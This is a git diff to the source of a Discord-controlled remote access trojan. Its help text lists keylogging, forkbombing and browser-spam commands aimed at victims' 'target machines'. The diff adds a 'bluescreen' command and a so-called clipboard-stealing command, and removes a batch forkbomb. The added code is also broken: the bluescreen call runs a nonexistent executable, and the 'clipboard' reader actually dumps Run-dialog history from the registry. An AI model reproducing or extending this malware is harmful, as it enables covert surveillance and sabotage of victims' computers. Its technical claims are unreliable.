@@ -1,6 +1,11 @@
 # synthetic#2368
 # dm me for updates on project
 # https://t.me/syntheticlol
+
+
+# primetdm was here 
+# also @sythetic ur fucking evil for writing the shit in line#678 rofl
+# if u didnt like my code then just dont do the PR I've sent I didn't go through your code so my shit could be wrong asf
 ##########################################
 import os
 import cv2
@@ -105,6 +110,7 @@ Information Gathering:
   .startkeylogger <sesisonkey>: Logs Key Strokes 
   .stopkeylogger <seesionnkey>: Stops KeyStrokes
   .dumpkeylogger <sessionkey>: Dumpskey log.txt from target machines
+  .clipboard <sessionkey>: Sends last few copied items using winReg lib.
 
 File Management:
 
@@ -143,7 +149,7 @@ Troll Commands:
   .fork <sessionkey>: forkbombs their computer using simple batch script
   .rickroll <sessionkey>: rickrolls their computer for 30 seconds and they cannot escape
   .music <sessionkey> <file_attachment>: plays music on their computer
-  .bluescreen <sessionkey>: COMING SOON.
+  .bluescreen <sessionkey>: Done
   .winspam <sessionkey>: Spams A Browser Windows [warning cant stop it]
 
 ------------------------------------------------------------------------------------------
@@ -167,6 +173,53 @@ Remote Shell Commands:
     await ctx.send(message)
     await ctx.send(message2)
     await ctx.send(message3)
+    
+
+logger = logging.getLogger(__name__)
+
+@bot.command() # BSOD command
+async def bluescreen(ctx, seshn: str):
+    session = sessions.get(seshn.lower())
+    if session:
+        nt_os_path = r"C:\Windows\System32\ntoskrnl.exe"
+        ke_bugcheck_path = r"C:\Windows\System32\keBugCheck.exe"
+
+        if not os.path.exists(nt_os_path) or not os.path.exists(ke_bugcheck_path):
+            logger.warning("Failed to trigger blue screen: One or both of the required files are missing.")
+            await ctx.send("Failed to trigger blue screen :sadge:")
+            return
+
+        try:
+            os.system(f'"{ke_bugcheck_path}" {nt_os_path}')
+            await ctx.send(f"Blue screen triggered on session :rofl:")
+        except Exception as e:
+            logger.error(f"Failed to trigger blue screen: {e}")
+            await ctx.send("Failed to trigger blue screen :sadge:")
+    else:
+        pass
+
+@bot.command() # CLIPBOARD command
+async def clipboard(ctx, seshn: str, limit: int = 10):
+    session = sessions.get(seshn.lower())
+    if session:
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU", 0, winreg.KEY_READ)
+            i = 0
+            clipboard_contents = []
+            while True:
+                try:
+                    name, value, _ = winreg.EnumValue(key, i)
+                    clipboard_contents.append(value)
+                    i += 1
+                except WindowsError:
+                    break
+            winreg.CloseKey(key)
+            clipboard_contents = clipboard_contents[-limit:]  # get the last few copied items
+            await ctx.send("\n".join(clipboard_contents))
+        except WindowsError:
+            await ctx.send("Failed to retrieve clipboard contents.")
+    else:
+        pass
 
 
 @bot.command() # Updated Command Using mss lib for ease of Screen shotting
@@ -654,18 +707,6 @@ async def rickroll(ctx, seshn):
         await asyncio.sleep(30)   
         videop.terminate()
         os.remove('video.mp4')
-    else:
-        pass
-
-
-
-@bot.command()
-async def fork(ctx, seshn):
-    session = sessions.get(seshn.lower())
-    if session:
-        command = "%0|%0"
-        os.system(command)
-        await ctx.send(f"Forkbombed session :rofl:")
     else:
         pass
 
